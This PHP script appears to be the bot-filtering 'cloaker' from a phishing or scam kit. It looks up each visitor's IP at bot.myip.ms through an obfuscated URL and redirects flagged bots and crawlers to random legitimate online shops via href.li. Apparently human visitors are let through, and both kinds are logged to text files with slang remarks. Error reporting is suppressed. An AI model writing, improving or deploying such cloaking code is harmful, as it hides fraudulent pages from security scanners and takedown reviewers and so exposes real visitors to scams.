<?php

require_once "functions.php";


session_start();
error_reporting(0);
$link = array(
"https://href.li/?https://www.danicathreesixty.com",
"https://href.li/?https://www.thegldshop.com",
"https://href.li/?https://704-shop.myshopify.com",
"https://href.li/?https://corgi-overload-store.myshopify.com",
"https://href.li/?https://www.cubowl.com",
"https://href.li/?https://woolman.io",
"https://href.li/?https://store.lilbub.com",
"https://href.li/?https://www.davdev9.com",
"https://href.li/?https://shop-demure.com",
"https://href.li/?https://www.elevenmadisonpark.store",
"https://href.li/?https://faktr-store.com",
"https://href.li/?https://www.wanderlust.store");
$random = rand(0, 11);
$link = $link[$random];
$client  = @$_SERVER['HTTP_CLIENT_IP'];
$forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
$remote  = @$_SERVER['REMOTE_ADDR'];
if(filter_var($client, FILTER_VALIDATE_IP)){
    $ip = $client;
}
elseif(filter_var($forward, FILTER_VALIDATE_IP)){
    $ip = $forward;
}
else{
    $ip = $remote;
}
$getfile = file_get_contents(urldecode('http%3A%2F%2Fbot.myip.ms%2F').$ip.'');
end;
if(preg_match("/Not listed/i",$getfile)){
$file = fopen("not_bot.txt","a");
fwrite($file," hada rwejel mashi bot :v || user-agent : ".$_SERVER['HTTP_USER_AGENT']."\n ip : ". $ip." || ".gmdate ("Y-n-d")." ----> ".gmdate ("H:i:s")."\n\n");
exit();
}else{
$file = fopen("block_bot.txt","a");
fwrite($file," wld 9a7ba 7sel :v || user-agent : ".$_SERVER['HTTP_USER_AGENT']."\n ip : ". $ip." || ".gmdate ("Y-n-d")." ----> ".gmdate ("H:i:s")."\n\n");
header("location: $link");
exit();
}
?>